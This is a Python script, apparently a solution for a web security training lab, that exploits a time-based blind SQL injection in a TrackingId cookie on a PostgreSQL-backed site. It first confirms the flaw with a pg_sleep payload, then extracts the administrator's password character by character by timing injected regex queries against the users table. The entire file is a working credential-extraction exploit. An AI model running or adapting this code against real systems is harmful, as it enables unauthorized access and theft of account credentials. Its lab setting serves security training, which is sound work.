import requests, sys, time
import string

# Get the lab hostname from command-line arguments and strip protocol/ending slash if present
site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

# Construct the base URL for GET requests
url = f'https://{site}/'

# Function to send a crafted TrackingId cookie and return the response time
def test_cookie(cookie_string):
    cookie_data = {
        'TrackingId': cookie_string  # Vulnerable cookie injection point
    }
    resp = requests.get(url, cookies=cookie_data)
    return resp.elapsed.total_seconds()

# Step 1: Sanity check — test that pg_sleep-based injection still causes a delay
print("[*] Confirming injection works...")
print(test_cookie("x"))  # Baseline response time (non-malicious)
print(test_cookie("x' || pg_sleep(3) -- "))  # Should delay response if injection works

# Step 2: Define the search charset (lowercase letters and digits)
charset = string.ascii_lowercase + string.digits
password = ""  # Initialize empty password guess
start_time = time.perf_counter()  # Start timer for total extraction time

print("\n[*] Starting linear brute-force password extraction...\n")

# Brute-force one character at a time until no next character matches
while True:
    found = False  # Track whether a valid next character was found in this round
    for char in charset:
        candidate = password + char  # Build candidate prefix (e.g., "a", then "ab", etc.)
        
        # Use regex match to test if password begins with this candidate
        # If true, server sleeps for 3 seconds, otherwise 0
        payload = f"""x'%3Bselect case when (username='administrator' and password ~ '^{candidate}') then pg_sleep(3) else pg_sleep(0) end from users--"""
        
        elapsed = test_cookie(payload)
        print(candidate)  # Print current guess attempt
        
        # If delay is observed, current character is correct — update password
        if elapsed > 3:
            password = candidate
            found = True
            break  # Go to next round to find next character

    # If no character caused a delay, password is complete — exit loop
    if not found:
        break

# End timer and report final password + total time taken
end_time = time.perf_counter()
print(f"\nDone. Found {password}")
print(f"Time elapsed is {end_time - start_time}")